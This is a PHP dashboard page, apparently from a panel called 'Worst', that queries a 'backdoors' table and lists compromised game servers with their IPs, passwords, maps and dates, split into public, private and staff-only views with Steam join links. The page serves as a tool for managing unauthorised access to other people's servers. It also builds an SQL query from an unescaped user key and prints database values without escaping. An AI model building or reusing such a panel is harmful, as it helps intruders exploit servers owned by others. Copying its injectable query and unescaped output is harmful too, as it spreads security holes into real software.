<?php
require_once('config.php');

$all = $link->query("SELECT * FROM backdoors");
$public = $link->query("SELECT * FROM backdoors WHERE userkey = 'NONE'");
$private = $link->query("SELECT * FROM backdoors WHERE userkey = '$userkey'");

// create a top bar for the middle frame
// have a button to create bd link
// have public & private backdoor view
// display the information in rows

?>

<html>
    <head>
        <title>Worst</title>
        <link rel='stylesheet' href='css/dashboard/style.css'>
        <script src="js/jquery.min.js"></script>
        <script src="js/servers.js"></script>
        <?php 
            if($local['usergroup'] == "admin") { 
                echo("<style>.bar { width: 32%; } </style>");
            }
        ?>
    </head>
    <body>
        <?php include_once('inc/navbar.php'); ?>
        
        <div class="servers-card">
            <div class="top-bar">
                <button class="btn bar material-ripple" id="public">Public Servers</button>
                <button class="btn bar material-ripple" id="private" style="opacity:0.55;">Private Servers</button>
                <?php
                    if(in_array($local['usergroup'], $staff)) { 
                        echo('<button class="btn bar material-ripple" id="all" style="opacity:0.55;">All Servers</button>');
                    }
                ?>
            </div><br><br><br><br>
            <div class="private">
                <?php 
                    if($private->num_rows > 0) {
                        while($row = $private->fetch_assoc()) {

                            $server = $row['server'];
                            $serverip = $row['serverip'];
                            $gamemode = $row['gamemode'];
                            $password = $row['password'];
                            $date = $row['date'];
                            $map = $row['map'];
                            $net = $row['net'];

                            // steam://connect/$serverip

                            echo("<div class='server-select'>
                                <table class='server-items'><br>
                                    <tr>
                                        <td class='server-text'><strong>Server: </strong><span>$server</span></td>
                                        <td class='server-text'><strong>Server-Ip: </strong><span>$serverip</span></td>
                                        <td class='server-text'><strong>Gamemode: </strong><span>$gamemode</span></td>
                                        <td class='server-text'><strong>Password: </strong><span>$password</span></td>
                                        <td class='server-text'><strong>Net: </strong><span>$net</span></td>
                                        <td class='server-text'><strong>Map: </strong><span>$map</span></td>
                                        <td class='server-text'><strong>Date: </strong><span>$date</span></td>
                                    </tr>
                                </table>
                                <a href='steam://connect/$serverip'><img class='rounded-circle log-pfp' src='img/steam.png'></a>
                            </div>");
                        }
                    }
                ?>
            </div>
            <div class="public">
                <?php 
                    if($public->num_rows > 0) {
                        while($row = $public->fetch_assoc()) {

                            $server = $row['server'];
                            $serverip = $row['serverip'];
                            $gamemode = $row['gamemode'];
                            $password = $row['password'];
                            $date = $row['date'];
                            $map = $row['map'];
                            $net = $row['net'];

                            // steam://connect/$serverip

                            echo("<div class='server-select'>
                                <table class='server-items'><br>
                                    <tr>
                                        <td class='server-text'><strong>Server: </strong><span>$server</span></td>
                                        <td class='server-text'><strong>Server-Ip: </strong><span>$serverip</span></td>
                                        <td class='server-text'><strong>Gamemode: </strong><span>$gamemode</span></td>
                                        <td class='server-text'><strong>Password: </strong><span>$password</span></td>
                                        <td class='server-text'><strong>Net: </strong><span>$net</span></td>
                                        <td class='server-text'><strong>Map: </strong><span>$map</span></td>
                                        <td class='server-text'><strong>Date: </strong><span>$date</span></td>
                                    </tr>
                                </table>
                                <a href='steam://connect/$serverip'><img class='rounded-circle log-pfp' src='img/steam.png'></a>
                            </div>");
                        }
                    }
                ?>
            </div>
            <?php 
                if(in_array($local['usergroup'], $staff)) { 
                    echo("<div class='all'>");
                    if($all->num_rows > 0) {
                        while($row = $all->fetch_assoc()) {

                            $server = $row['server'];
                            $serverip = $row['serverip'];
                            $gamemode = $row['gamemode'];
                            $password = $row['password'];
                            $date = $row['date'];
                            $map = $row['map'];
                            $net = $row['net'];

                            // steam://connect/$serverip

                            echo("<div class='server-select'>
                                <table class='server-items'><br>
                                    <tr>
                                        <td class='server-text'><strong>Server: </strong><span>$server</span></td>
                                        <td class='server-text'><strong>Server-Ip: </strong><span>$serverip</span></td>
                                        <td class='server-text'><strong>Gamemode: </strong><span>$gamemode</span></td>
                                        <td class='server-text'><strong>Password: </strong><span>$password</span></td>
                                        <td class='server-text'><strong>Net: </strong><span>$net</span></td>
                                        <td class='server-text'><strong>Map: </strong><span>$map</span></td>
                                        <td class='server-text'><strong>Date: </strong><span>$date</span></td>
                                    </tr>
                                </table>
                                <a href='steam://connect/$serverip'><img class='rounded-circle log-pfp' src='img/steam.png'></a>
                            </div>");
                        }
                    }
                }
            ?>
        </div>
    </body>
</html>